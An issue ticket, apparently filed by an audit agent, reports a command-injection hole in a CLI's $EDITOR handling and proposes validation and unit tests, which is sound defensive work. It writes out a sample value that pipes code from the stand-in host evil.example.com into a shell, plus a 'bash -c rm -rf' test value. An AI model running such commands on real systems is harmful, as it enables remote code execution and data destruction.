---
id: w-49aol9fa
title: fix: $EDITOR command injection via whitespace split
template: bugfix
phase: planning
priority: critical
author: audit-claude
tags: [security, cli, injection, audit-2026-04-26]
references: []
codeRefs: []
dependencies: []
blockedBy: []
createdAt: 2026-04-26T11:31:00.482Z
updatedAt: 2026-04-26T11:31:00.482Z
enrichmentRolesJson: {"items":[{"role":"testing","agentId":"audit-claude","status":"pending"}]}
reviewersJson: {"items":[]}
phaseHistoryJson: {"items":[{"phase":"planning","enteredAt":"2026-04-26T11:31:00.482Z"}]}
---

## Issue

`$EDITOR` / `$VISUAL` are split on whitespace and executed via `spawnSync` without any shell-escape or validation. A compromised parent shell that exports `EDITOR="/bin/bash -c 'evil'"` (or any value with shell metacharacters) gets executed when the user runs any CLI subcommand that supports `--edit`.

## Scenario

```bash
EDITOR="bash -c 'curl evil.example.com | sh'"
monsthera knowledge create --edit --title "..." --category guide
```

The `--edit` path opens an editor seeded from a template; the malicious `EDITOR` is parsed by `parts = editor.split(/\s+/)` and the first token is spawned with the rest as args.

## File / line

- `src/cli/arg-helpers.ts:94-107` — `openInEditor()` helper.
- Callers: every `--edit` flag across `knowledge create`, `work create`, `knowledge update`, etc.

## Impact

Local privilege escalation: any code-execution vector that can set env vars in the parent process gets a foothold the moment the user runs `monsthera --edit`. Realistic in shared CI runners, dev containers, or after a malicious `direnv`/`.envrc` is sourced.

## Suggested fix

Reject editors with whitespace, or use `shell-quote.parse()` to honor proper shell quoting, or only accept a single executable token plus pre-validated argv. Simplest safe path:

```ts
const editor = process.env.VISUAL || process.env.EDITOR || "vi";
if (/[\s;&|`$<>(){}\\]/.test(editor)) {
  return err(new ValidationError("$EDITOR contains shell metacharacters; refusing to spawn"));
}
spawnSync(editor, [tmp], { stdio: "inherit" });
```

## Validation

- New unit test in `tests/unit/cli/arg-helpers.test.ts` asserting that `openInEditor` rejects `EDITOR="bash -c 'rm -rf'"`.
- Manual smoke: `EDITOR="echo hi" monsthera knowledge create --edit ...` should still work.

## References

- Audit 2026-04-26, security finding #1.
